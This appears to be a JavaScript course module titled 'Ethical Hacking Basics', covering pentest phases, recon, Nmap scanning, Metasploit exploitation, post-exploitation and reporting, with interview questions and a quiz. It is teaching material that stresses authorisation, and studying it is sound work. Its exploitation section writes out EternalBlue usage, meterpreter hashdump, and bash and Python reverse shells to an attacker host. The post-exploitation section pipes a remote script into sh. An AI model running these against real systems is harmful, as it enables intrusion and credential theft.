const M4={title:'Ethical Hacking Basics',topics:[
{title:'Penetration Testing Lifecycle',
def:'Penetration testing is an authorised simulated cyber attack to evaluate a system\'s security. It follows a structured 6-phase methodology.',
why:'Structure ensures no phase is skipped. All pentesting requires explicit written authorisation — without it, it is illegal hacking.',
commands:cb('Pentest Phases',`1. PLANNING & RECONNAISSANCE
   ├── Define scope (what is in/out of bounds)
   ├── Sign Rules of Engagement (RoE)
   └── Passive & active information gathering

2. SCANNING & ENUMERATION
   ├── Port scanning (Nmap)
   ├── Service detection
   └── Directory/subdomain enumeration

3. VULNERABILITY ASSESSMENT
   ├── Identify weaknesses in discovered services
   ├── Match to CVEs
   └── Prioritise by CVSS score

4. EXPLOITATION
   ├── Attempt to exploit vulnerabilities
   └── Document proof of access

5. POST-EXPLOITATION
   ├── Privilege escalation
   ├── Lateral movement
   └── Data exfiltration simulation

6. REPORTING
   └── Document findings, risk ratings, remediation

Pentest types:
  Black Box  → No prior knowledge (simulates external attacker)
  White Box  → Full access: source code, architecture diagrams
  Grey Box   → Partial: user credentials, network diagram (most common)`),
interview:[{q:'What is the difference between black box and grey box testing?',a:'Black box: no prior knowledge given, simulates external attacker. Grey box: partial info (e.g., user credentials) provided — most common in real engagements.'},{q:'What is scope creep in pentesting?',a:'Testing systems outside the agreed scope — this is illegal even during authorised engagements.'}],
summary:'6 phases: Planning→Scanning→VA→Exploitation→Post-Exploitation→Reporting. Always get written RoE. Black=no info | White=full info | Grey=partial.'},

{title:'Reconnaissance',
def:'Recon is the first phase — gathering maximum information about the target. Passive recon avoids direct contact; active recon interacts with the target.',
why:'More recon = better attack planning. Attackers spend 70% of their time in recon. OSINT reveals the attack surface.',
commands:cb('Recon Techniques & Tools',`# PASSIVE RECON (no target contact)

# WHOIS — domain registration info
whois example.com

# DNS enumeration
dig example.com ANY
fierce --domain example.com         # Subdomain brute force

# Email/subdomain harvesting
theHarvester -d example.com -b google,linkedin,bing

# Google Dorking (OSINT via Google)
site:example.com                     # All indexed pages
filetype:pdf site:example.com        # PDF documents
intitle:"index of" site:example.com  # Open directories
inurl:admin site:example.com         # Admin panels
inurl:.php?id= site:example.com      # Potential SQLi points

# SSL certificate transparency
# Visit: https://crt.sh/?q=example.com

# Shodan (exposed devices)
shodan search "apache 2.4.49"        # Find vulnerable servers
shodan host 93.184.216.34            # Info on an IP

# ACTIVE RECON (direct contact)
nmap -sn 192.168.1.0/24             # Ping sweep (live hosts)
nmap -sV 192.168.1.100              # Service detection`),
interview:[{q:'What is the difference between passive and active reconnaissance?',a:'Passive recon gathers info without touching the target (WHOIS, Google, LinkedIn). Active recon directly interacts with the target (scanning, pinging).'},{q:'What is Google Dorking?',a:'Using advanced Google search operators to find sensitive information like exposed admin panels, open directories, or vulnerable URLs.'}],
summary:'Passive=no target contact | Active=direct interaction. Tools: WHOIS, theHarvester, Shodan, crt.sh, Google Dorks. OSINT framework: osintframework.com'},

{title:'Scanning & Enumeration',
def:'Scanning discovers hosts, ports, and services. Enumeration extracts detailed info about those services to identify exploitable weaknesses.',
commands:cb('Nmap Scanning Reference',`# HOST DISCOVERY
nmap -sn 192.168.1.0/24          # Ping sweep

# PORT SCANNING
nmap 192.168.1.100               # Top 1000 TCP ports
nmap -p- 192.168.1.100           # All 65535 ports
nmap -p 80,443,22 192.168.1.100  # Specific ports

# SERVICE & VERSION
nmap -sV 192.168.1.100           # Service versions
nmap -sV -sC 192.168.1.100       # + default NSE scripts
nmap -A 192.168.1.100            # All: OS+version+scripts+trace

# STEALTH
nmap -sS 192.168.1.100           # SYN scan (half-open, quieter)
nmap -Pn 192.168.1.100           # Skip ping (assume host up)
nmap -T4 192.168.1.100           # Speed (T0=slowest, T5=fastest)

# VULNERABILITY SCANNING
nmap --script vuln 192.168.1.100
nmap --script smb-vuln-* 192.168.1.100

# OUTPUT
nmap -oN out.txt 192.168.1.100   # Normal text output
nmap -oX out.xml 192.168.1.100   # XML output

# FULL PENTEST SCAN (one-liner)
nmap -sV -sC -p- --min-rate 5000 192.168.1.100 -oN scan.txt

# ENUMERATION
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
enum4linux -a 192.168.1.100      # SMB enumeration (Windows)
smbclient -L \\192.168.1.100     # List SMB shares`),
interview:[{q:'What does nmap -sS do?',a:'TCP SYN scan — sends SYN packets but never completes the handshake. Quieter than full connect scan, less likely to be logged.'},{q:'What tool enumerates web directories?',a:'Gobuster or dirb — brute force directories and files using wordlists.'}],
summary:'nmap -sV=versions | -sC=scripts | -A=aggressive | -sS=stealth. Gobuster=web dirs. enum4linux=SMB. Full scan: nmap -sV -sC -p- --min-rate 5000 TARGET.'},

{title:'Vulnerability Assessment',
def:'VA identifies and rates vulnerabilities without exploiting them. Results are prioritised by CVSS severity for remediation.',
commands:cb('Vulnerability Assessment Tools',`# Nikto — web server scanner
nikto -h http://192.168.1.100
nikto -h https://192.168.1.100 -ssl
nikto -h http://192.168.1.100 -o report.txt

# Nmap vuln scripts
nmap --script vuln 192.168.1.100
nmap --script http-vuln-cve2017-5638 192.168.1.100  # Struts

# Searchsploit — offline exploit-db search
searchsploit vsftpd 2.3.4          # Find exploits
searchsploit apache 2.4.49
searchsploit -m 49757              # Copy exploit to current dir
searchsploit -x 49757              # Examine without copying

# Online resources
# https://cve.mitre.org/          CVE database
# https://nvd.nist.gov/           CVSS scores
# https://exploit-db.com/          Public exploits
# https://vulners.com/             Unified vuln search

# CVSS Severity:
# 9.0-10.0 = Critical | 7.0-8.9 = High
# 4.0-6.9  = Medium   | 0.1-3.9 = Low`),
interview:[{q:'What is the difference between vulnerability assessment and penetration testing?',a:'VA identifies and rates vulnerabilities without exploiting them. Pentesting actually exploits them to demonstrate real-world impact.'},{q:'What is CVE?',a:'Common Vulnerabilities and Exposures — a unique identifier for publicly known vulnerabilities (e.g., CVE-2021-44228 for Log4Shell).'}],
summary:'VA=find+rate, no exploit. Nikto=web scanner | searchsploit=offline exploit-db | CVSS 9-10=Critical. Always check NVD for CVSS score and patch info.'},

{title:'Exploitation Basics',
def:'Exploitation uses vulnerabilities to gain unauthorised access or execute code. Always performed within authorised scope only.',
commands:cb('Metasploit Framework',`# Launch
msfconsole

# Inside msfconsole:
search eternalblue                    # Find modules by keyword
search type:exploit platform:windows  # Filter search
use exploit/windows/smb/ms17_010_eternalblue
info                                  # Module details
show options                          # Required parameters
set RHOSTS 192.168.1.100              # Target IP
set LHOST 192.168.1.10                # Attacker IP
set LPORT 4444                        # Listener port
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run                                   # Execute

# Meterpreter (post-exploit shell)
sysinfo                    # System info
getuid                     # Current user
getsystem                  # Attempt privesc
hashdump                   # Dump NTLM hashes
shell                      # Drop to OS shell
download file.txt          # Exfiltrate file
upload tool.exe            # Upload file

# Manual reverse shell (Netcat listener on attacker)
nc -lvnp 4444

# Bash reverse shell (on victim)
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python reverse shell
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'`),
interview:[{q:'What is the difference between a bind shell and a reverse shell?',a:'Bind shell: target listens, attacker connects to it. Reverse shell: target connects back to attacker — preferred because it bypasses inbound firewall rules.'},{q:'What is Meterpreter?',a:'An advanced Metasploit payload providing a feature-rich shell running entirely in memory — includes file operations, pivoting, and privilege escalation modules.'}],
summary:'Metasploit=primary exploit framework. Reverse shell=target→attacker (bypasses firewall). Meterpreter=advanced in-memory shell. ALWAYS stay within scope.'},

{title:'Post-Exploitation',
def:'Post-exploitation actions after initial access: privilege escalation, persistence, lateral movement, and data collection — simulating a real attacker\'s impact.',
commands:cb('Post-Exploitation Checklist',`# PRIVILEGE ESCALATION (Linux)
sudo -l                              # Check sudo rights
find / -perm -4000 2>/dev/null       # SUID binaries
cat /etc/crontab && ls /etc/cron*    # Cron jobs
uname -a                             # Kernel version
cat /etc/passwd | grep -v nologin    # Shell users
env | grep -i pass                   # Passwords in env vars

# Automated Linux privesc enum
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or upload and run: ./linpeas.sh | tee linpeas.txt

# PRIVILEGE ESCALATION (Windows)
whoami /priv                         # Privileges
systeminfo                           # OS + patches
net user && net localgroup administrators
# Upload and run WinPEAS
.\winPEASx64.exe | Out-File winpeas.txt

# Meterpreter post-exploitation
run post/multi/recon/local_exploit_suggester
run post/linux/gather/enum_system

# GTFOBins — sudo/SUID privesc:
# https://gtfobins.github.io
# LOLBAS  — Windows equiv:
# https://lolbas-project.github.io`),
interview:[{q:'What is LinPEAS?',a:'An automated script that enumerates Linux privilege escalation vectors — checks SUID files, sudo rights, writable paths, cron jobs, kernel exploits, etc.'},{q:'What is lateral movement?',a:'Moving from one compromised machine to others on the network using stolen credentials, pass-the-hash, or remote services.'}],
summary:'Privesc: sudo -l + SUID + cron + kernel. LinPEAS/WinPEAS=automated enum. GTFOBins=privesc techniques. Document everything for report.'},

{title:'Professional Reporting',
def:'The pentest report is the primary deliverable — it communicates findings, risks, and remediation to both technical staff and executives.',
commands:cb('Report Structure',`PENETRATION TEST REPORT TEMPLATE
═══════════════════════════════

1. EXECUTIVE SUMMARY
   • High-level findings for management
   • Overall risk rating
   • Business impact summary (non-technical)

2. SCOPE & METHODOLOGY
   • Systems tested, dates, approach
   • Tools used

3. FINDINGS SUMMARY TABLE
   ┌──────────────────────┬──────────────┬────────┐
   │ Finding              │ Severity     │ CVSS   │
   ├──────────────────────┼──────────────┼────────┤
   │ SQL Injection        │ Critical     │ 9.8    │
   │ Default Credentials  │ High         │ 8.1    │
   │ Missing HTTPS        │ Medium       │ 5.3    │
   └──────────────────────┴──────────────┴────────┘

4. DETAILED FINDINGS (per vulnerability)
   • Title
   • Severity + CVSS Score
   • Description
   • Evidence (screenshots, command output)
   • Impact (what attacker can do)
   • Recommendation (specific fix)
   • References (CVE, OWASP, vendor)

5. APPENDICES
   • Raw scan output
   • Tool versions used

Writing rules:
  ✓ Evidence for every claim (screenshots)
  ✓ Specific remediation (not "fix the code")
  ✓ Plain English in executive summary
  ✓ Never exaggerate or fabricate findings`),
interview:[{q:'What two audiences must a pentest report address?',a:'Executives (non-technical — business impact, risk ratings) and technical staff (detailed reproduction steps, specific remediation).'},{q:'What must every finding include?',a:'Title, severity, description, evidence (screenshots/output), impact, and specific remediation recommendation.'}],
summary:'Report=most important deliverable. Two audiences: exec (risk/impact) + technical (details/fix). Every finding needs evidence. CVSS rates severity. Use Dradis or Pwndoc for report writing.',
quiz:qz('Which type of pentest provides the tester with full information including source code?',['Black Box','Grey Box','White Box','Red Team'],2,'White box testing provides full information: source code, architecture, credentials. Black box=no info. Grey box=partial info.')}
]};
